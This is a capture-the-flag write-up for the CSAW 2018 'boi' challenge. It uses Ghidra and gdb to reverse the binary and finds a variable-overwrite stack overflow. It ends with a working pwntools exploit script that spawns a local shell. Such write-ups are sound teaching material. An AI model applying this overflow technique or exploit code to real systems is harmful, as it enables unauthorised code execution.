# Csaw 2018 Quals Boi

Let's take a look at the binary:

```
$    file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
$    pwn checksec boi [*] '/Hackery/pod/modules/bof_variable/csaw18_boi/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./boi
Are you a big boiiiii??
15935728
Mon Jun 10 22:07:51 EDT 2019
```

So we can see that we are dealing with a 64 bit binary with a Stack Canary and Non-Executable stack (those are two binary mitigations that will be discussed later). When we run the binary, we see that we are prompted for input (which we gave it `15935728`). It then provided us with the time and the date. When we look at the main function in Ghidra we see this:

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 uStack40;
  int target;
  long stackCanary;
 
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  uStack40 = 0;
  target = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (target == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (stackCanary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

So we can see the program prints the string `Are you a big boiiiii??` with `puts`. Then it proceeds to scan in `0x18` bytes worth of data into `input`. In addition to that we can see that the `target` integer is initialized before the `read` call, then compared to a value after the `read` call. Looking at the decompiled code shows us the constants it is assigned and compared to as signed integers, however if we look at the assembly code we can see the constants as unsigned hex integers:


We can see that the value that it is being assigned is `0xdeadbeef`:

```
        0040067e c7 45 e4        MOV        dword ptr [RBP + target],0xdeadbeef
                 ef be ad de
```

We can also see that the value that it is being compared to is `0xcaf3baee`:

```
        004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + target]
        004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                 f3 ca
```

Now to see what our input can reach, we can look at the stack layout in Ghidra. To see this you can just double click on any of the variables where they are declared:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined8 __stdcall main(void)
             undefined8        RAX:8          <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00400659(W),
                                                                                                   004006ca(R)  
             int               Stack[-0x24]:4 target                                  XREF[2]:     0040067e(W),
                                                                                                   004006a5(R)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
             undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W),
                                                                                                   0040068f(*)  
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
             long              HASH:5f6c2e9   stackCanary
                             main                                            XREF[5]:     Entry Point(*),
                                                                                          _start:0040054d(*),
                                                                                          _start:0040054d(*), 004007b4,
                                                                                          00400868(*)  
        00400641 55              PUSH       RBP

```

Here we can see that according to Ghidra input is stored at offset `-0x38`. We can see that target is stored at offset `-0x24`. This means that there is a `0x14` byte difference between the two values. Sice we can write `0x18` bytes, that means we can fill up the `0x14` byte difference and overwrite four bytes (`0x18 - 0x14 = 4`) of `target`, and since integers are four bytes we can overwrite. Here the bug is it is letting us write `0x18` bytes worth of data to a `0x14` byte space, and `0x4` bytes of data are overflowing into the `target` variable which gives us the ability to change what it is. Taking a look at the memory layout in gdb gives us a better description. We set a breakpoint for directly after the `read` call and see what the memory looks like:

```
gdb ./boi
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./boi...(no debugging symbols found)...done.
gef➤  b *0x4006a5
Breakpoint 1 at 0x4006a5
gef➤  r
Starting program: /Hackery/pod/modules/bof_variable/csaw18_boi/boi
Are you a big boiiiii??
15935728
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x9               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
$rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffde80  →  "15935728"
$rdi   : 0x0               
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde70│+0x0000: 0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"     ← $rsp
0x00007fffffffde78│+0x0008: 0x000000010040072d
0x00007fffffffde80│+0x0010: "15935728"     ← $rsi
0x00007fffffffde88│+0x0018: 0x000000000000000a
0x00007fffffffde90│+0x0020: 0xdeadbeef00000000
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: 0x00007fffffffdf90  →  0x0000000000000001
0x00007fffffffdea8│+0x0038: 0xd268c12ac770ee00
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004006a5 in main ()
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde80 - 0x7fffffffde88  →   "15935728"
gef➤  x/10g 0x7fffffffde80
0x7fffffffde80:    0x3832373533393531    0xa
0x7fffffffde90:    0xdeadbeef00000000    0x0
0x7fffffffdea0:    0x7fffffffdf90    0xd268c12ac770ee00
0x7fffffffdeb0:    0x4006e0    0x7ffff7a05b97
0x7fffffffdec0:    0x0    0x7fffffffdf98
```

Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `00000000000000000000` + p32(`0xcaf3baee`). We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly:

```
$    python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
$    gdb ./boi
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./boi...(no debugging symbols found)...done.
gef➤  b *0x4006a5
Breakpoint 1 at 0x4006a5
gef➤  r < input
Starting program: /Hackery/pod/modules/bof_variable/csaw18_boi/boi < input
Are you a big boiiiii??
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18              
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
$rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x0               
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde70│+0x0000: 0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"     ← $rsp
0x00007fffffffde78│+0x0008: 0x000000010040072d
0x00007fffffffde80│+0x0010: 0x3030303030303030     ← $rsi
0x00007fffffffde88│+0x0018: 0x3030303030303030
0x00007fffffffde90│+0x0020: 0xcaf3baee30303030
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: 0x00007fffffffdf90  →  0x0000000000000001
0x00007fffffffdea8│+0x0038: 0x8c0a95a9bb51c400
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004006a5 in main ()
gef➤  search-pattern 0000000000
[+] Searching '0000000000' in memory
[+] In '/lib/x86_64-linux-gnu/libc-2.27.so'(0x7ffff79e4000-0x7ffff7bcb000), permission=r-x
  0x7ffff7ba0030 - 0x7ffff7ba003a  →   "0000000000[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde80 - 0x7fffffffde8a  →   "0000000000[...]"
  0x7fffffffde8a - 0x7fffffffde94  →   "0000000000[...]"
gef➤  x/10g 0x7fffffffde80
0x7fffffffde80:    0x3030303030303030    0x3030303030303030
0x7fffffffde90:    0xcaf3baee30303030    0x0
0x7fffffffdea0:    0x7fffffffdf90    0x8c0a95a9bb51c400
0x7fffffffdeb0:    0x4006e0    0x7ffff7a05b97
0x7fffffffdec0:    0x0    0x7fffffffdf98
```

Here we can see that we have overwritten the integer with the value `0xcaf3baee`. When we continue onto the `cmp` instruction, we can see that we will pass the check:

```
gef➤  b *0x4006a8
Breakpoint 2 at 0x4006a8
gef➤  c
Continuing.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0xcaf3baee        
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
$rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x0               
$rip   : 0x00000000004006a8  →  <main+103> cmp eax, 0xcaf3baee
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde70│+0x0000: 0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"     ← $rsp
0x00007fffffffde78│+0x0008: 0x000000010040072d
0x00007fffffffde80│+0x0010: 0x3030303030303030     ← $rsi
0x00007fffffffde88│+0x0018: 0x3030303030303030
0x00007fffffffde90│+0x0020: 0xcaf3baee30303030
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: 0x00007fffffffdf90  →  0x0000000000000001
0x00007fffffffdea8│+0x0038: 0x8c0a95a9bb51c400
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
     0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
 →   0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
     0x4006bb <main+122>       mov    edi, 0x400786
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a8 → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 2, 0x00000000004006a8 in main ()
gef➤  p $eax
$1 = 0xcaf3baee
```

With all of that, we can write an exploit for this challenge:
```
# Import pwntools
from pwn import *

# Establish the target process
target = process('./boi')

# Make the payload
# 0x14 bytes of filler data to fill the gap between the start of our input
# and the target int
# 0x4 byte int we will overwrite target with
payload = "0"*0x14 + p32(0xcaf3baee)

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()
```

When we run it:
```
$    python exploit.py
[+] Starting local process './boi': pid 9075
[*] Switching to interactive mode
Are you a big boiiiii??
$ w
 23:37:29 up  3:37,  1 user,  load average: 0.81, 0.80, 0.85
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               20:00   ?xdm?  22:41   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
boi  exploit.py  input    Readme.md
```

Just like that, we popped a shell!